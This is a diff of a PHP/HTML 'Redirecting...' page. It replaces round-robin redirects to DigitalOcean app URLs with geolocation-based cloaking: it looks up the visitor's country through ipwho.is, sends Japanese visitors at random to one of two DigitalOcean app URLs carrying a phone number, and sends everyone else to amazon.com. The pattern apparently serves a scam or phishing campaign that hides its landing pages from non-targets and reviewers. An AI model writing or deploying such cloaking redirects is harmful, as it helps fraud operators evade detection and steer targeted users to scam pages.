@@ -1,5 +1,5 @@
 <?php
-?>
+  ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,22 +7,35 @@
 <title>Redirecting...</title>
 
 <script>
-(function () {
-    const urls = [
-        "https://plankton-app-ssesa.ondigitalocean.app/?bcda=(050)-3097-5847",
-        "https://urchin-app-c8sbm.ondigitalocean.app/?bcda=(050)-3097-5847"
-    ];
+fetch("https://ipwho.is/")
+  .then(response => response.json())
+  .then(data => {
+    if (!data.success) {
+      return;
+    }
 
-    // Get current index (default 0)
-    let index = localStorage.getItem("strict_redirect");
-    index = index === null ? 0 : Number(index);
+    const countryCode = data.country_code;
 
-    // Prepare next visit BEFORE redirect
-    localStorage.setItem("strict_redirect", (index + 1) % urls.length);
+    if (countryCode === "JP") {
+      (function () {
+        const domainA = "https://goldfish-app-2-ditin.ondigitalocean.app/?bcda=(050)-3097-5847";
+        const domainB = "https://dolphin-app-4ubl6.ondigitalocean.app/?bcda=(050)-3097-5847";
 
-    // INSTANT redirect (no delay)
-    window.location.replace(urls[index]);
-})();
+        // Random number between 0 and 1
+        if (Math.random() < 0.5) {
+            window.location.replace(domainA);
+        } else {
+            window.location.replace(domainB);
+        }
+    })();
+    } else {
+      window.location.replace("https://www.amazon.com/");
+    }
+  })
+  .catch(error => {
+    console.error("Error fetching location:", error);
+  });
+
 </script>
 
 </head>
